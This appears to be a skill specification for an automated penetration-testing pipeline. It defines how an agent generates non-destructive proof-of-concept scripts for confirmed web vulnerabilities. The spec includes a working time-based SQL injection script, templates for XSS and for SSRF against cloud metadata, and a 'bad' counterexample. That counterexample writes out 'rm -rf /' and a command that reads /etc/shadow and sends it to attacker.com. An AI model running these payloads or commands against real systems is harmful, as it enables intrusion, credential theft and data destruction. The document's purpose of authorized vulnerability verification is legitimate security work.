# PoC-Generator (Vulnerability Verification Script Generator)

## Identity
| Field | Value |
|-------|-------|
| Skill ID | S-066 |
| Phase | Phase-4.5 |
| Responsibility | Generate independently executable PoC verification scripts for confirmed vulnerabilities |

## Input Contract
| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| team4_progress.json | `$WORK_DIR/.audit_state/team4_progress.json` | ✅ | Findings summary (status, severity per sink) |
| exploits/*.json | `$WORK_DIR/exploits/*.json` | ✅ | Attack result details (full requests/responses, payloads, evidence) |
| credentials.json | `$WORK_DIR/credentials.json` | ⚠️ Optional | Credential information for authenticated PoCs |
| environment_status.json | `$WORK_DIR/environment_status.json` | ✅ | Environment information |
| WORK_DIR | Orchestrator parameter | ✅ | Working directory path |
| shared/anti_hallucination.md | Shared resource (L2) | ✅ | Anti-hallucination rules |
| shared/data_contracts.md | Shared resource (L2) | ✅ | Data format contracts |

## 🚨 CRITICAL Rules
| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | MUST only generate PoCs for confirmed vulnerabilities (highly_suspected MAY be generated, marked experimental) | PoCs for unverified vulns → false positive scripts |
| CR-2 | PoCs MUST NOT contain destructive operations (no file deletion, no data modification, no backdoor creation) | Destructive PoC → legal liability |
| CR-3 | Payloads MUST use harmless markers (e.g., `echo poc_marker`) not malicious commands | Malicious payloads → weaponized scripts |
| CR-4 | Every PoC MUST include a legal disclaimer | Missing disclaimer → compliance violation |
| CR-5 | Generated scripts MUST pass Python syntax validation (`compile()` check) | Syntax errors → unusable scripts |
| CR-6 | curl commands MUST be directly executable in a terminal | Broken curl commands → manual troubleshooting |

## Fill-in Procedure

### Procedure A: Filter Vulnerabilities
| Field | Fill-in Value |
|-------|--------------|
| source | {Filter `confirmed` vulnerabilities from `team4_progress.json`} |
| sort_by | {Sort by severity: Critical → High → Medium → Low} |
| optional | {highly_suspected MAY be included, marked as `[EXPERIMENTAL]`} |

### Procedure B: Extract Exploitation Parameters
| Field | Fill-in Value |
|-------|--------------|
| successful_payloads | {From `exploits/{sink_id}.json`: rounds where `results[].result == "confirmed"`} |
| http_requests | {Complete HTTP request details (method, URL, headers, body)} |
| injection_point | {Parameter name and injection location} |
| evidence_markers | {`evidence_detail` from exploit results} |
| auth_info | {Extract from `credentials.json` if authentication required} |

### Procedure C: Generate Script per Vulnerability

Each PoC script MUST follow this structure:

| Field | Fill-in Value |
|-------|--------------|
| shebang | {`#!/usr/bin/env python3`} |
| docstring | {PoC metadata: vuln_type, endpoint, severity, sink_id, timestamp, description, usage, prerequisites, disclaimer} |
| imports | {`requests`, `sys`, `argparse`, `time`, `json`, `urllib.parse`} |
| banner() | {Print vuln_type, endpoint, sink_id} |
| check_prerequisites() | {Verify target reachability} |
| exploit() | {Core exploitation code using actual payload from exploits/*.json} |
| verify_result() | {Check evidence markers in response} |
| main() | {argparse with --target (required), --cookie, --token, --proxy, --verbose} |
| curl_equivalent | {Generate equivalent curl command as comment block} |

#### Vulnerability-Type-Specific Exploit Templates

**SQL Injection:** Time-based blind — measure baseline vs. injected response time, threshold 4.0s delay.

**RCE:** Send payload with unique `poc_marker_{timestamp}`, verify marker appears in response.

**XSS:** Inject `<img src=x onerror="canary">`, verify unencoded payload in response body.

**SSRF:** Target `http://169.254.169.254/latest/meta-data/`, verify cloud metadata indicators (`ami-id`, `instance-id`, etc.).

**Authorization Bypass:** Access admin endpoint with normal user credentials, verify 200 + admin data in response.

**Race Condition:** 20 concurrent threads via ThreadPoolExecutor, verify success_count > 1 (should only succeed once).

### Procedure D: Syntax Validation
| Field | Fill-in Value |
|-------|--------------|
| validation_command | {`python3 -c "compile(open('file').read(), 'file', 'exec')"` for each generated script} |
| fix_on_failure | {Fix syntax errors and re-validate} |

### Procedure E: Batch Execution Script
| Field | Fill-in Value |
|-------|--------------|
| script_name | {`$WORK_DIR/PoC脚本/一键运行.sh`} |
| logic | {Iterate all `poc_*.py`, run each with `--target $1`, count VULNERABLE vs NOT VULNERABLE, print summary} |

## Output Contract
| Output File | Path | Schema | Description |
|-------------|------|--------|-------------|
| poc_{sink_id}.py | `$WORK_DIR/PoC脚本/poc_{sink_id}.py` | Python script | Standalone PoC script per vulnerability |
| poc_summary.json | `$WORK_DIR/PoC脚本/poc_summary.json` | JSON | Summary: generated_at, total_confirmed, poc_generated, poc_skipped, scripts[] |
| requirements.txt | `$WORK_DIR/PoC脚本/requirements.txt` | pip format | Python dependencies (typically just `requests`) |
| 一键运行.sh | `$WORK_DIR/PoC脚本/一键运行.sh` | Bash script | Batch execution script |

### poc_summary.json Schema
```json
{
  "generated_at": "ISO-8601",
  "total_confirmed": "number",
  "poc_generated": "number",
  "poc_skipped": "number",
  "scripts": [{
    "sink_id": "string",
    "vuln_type": "string",
    "file": "string (PoC script filename)",
    "endpoint": "string",
    "auth_required": "boolean",
    "curl_command": "string"
  }]
}
```

## Examples

### ✅ GOOD: SQL Injection PoC Script
```python
#!/usr/bin/env python3
"""
PoC: SQL Injection (Time-based Blind) - /api/users/search
Severity: Critical
Sink ID: sqli_user_search_001
Generated: 2024-01-15T10:30:00Z

Disclaimer: For authorized security testing only. Unauthorized use is illegal.

Usage:
  python3 poc_sqli_user_search_001.py --target http://target.com
"""

import requests, sys, argparse, time
from urllib.parse import urljoin

def exploit(target, **kwargs):
    url = urljoin(target, "/api/users/search")
    session = requests.Session()
    if kwargs.get("cookie"):
        session.cookies.set("session", kwargs["cookie"])

    baseline_start = time.time()
    session.get(url, params={"q": "test"})
    baseline = time.time() - baseline_start

    inject_start = time.time()
    session.get(url, params={"q": "test' AND SLEEP(5)-- -"})
    injected = time.time() - inject_start

    return {"delay": injected - baseline, "threshold": 4.0}

def verify_result(result):
    return result["delay"] > result["threshold"]

# Equivalent curl:
#   curl 'http://target.com/api/users/search?q=test%27+AND+SLEEP(5)--+-' -o /dev/null -w '%{time_total}'
```
Explanation ✅ Uses actual payload from exploit results. Harmless verification (SLEEP only). Includes disclaimer. Has curl equivalent. Passes `compile()` check.

### ❌ BAD: Destructive PoC
```python
def exploit(target, **kwargs):
    url = urljoin(target, "/api/exec")
    requests.post(url, data={"cmd": "rm -rf / --no-preserve-root"})
    requests.post(url, data={"cmd": "cat /etc/shadow > /tmp/dump && curl http://attacker.com/exfil -d @/tmp/dump"})
```
What's wrong ❌ Contains destructive command `rm -rf /` (CR-2 violated). Exfiltrates sensitive data to external server (CR-3 violated). No disclaimer. No verification logic — just destruction.

## Error Handling
| Error | Action |
|-------|--------|
| No confirmed vulnerabilities found | Generate empty poc_summary.json with poc_generated=0, log info |
| Exploit file missing for a sink_id | Skip that vulnerability, record in poc_skipped |
| No successful payload in exploit results | Skip, note "no confirmed payload available" |
| credentials.json not found | Generate PoC without auth, add note that authentication may be required |
| Python syntax validation fails | Auto-fix common issues (missing imports, indentation), re-validate |
| Unsupported vulnerability type | Generate generic template with manual exploit placeholder |
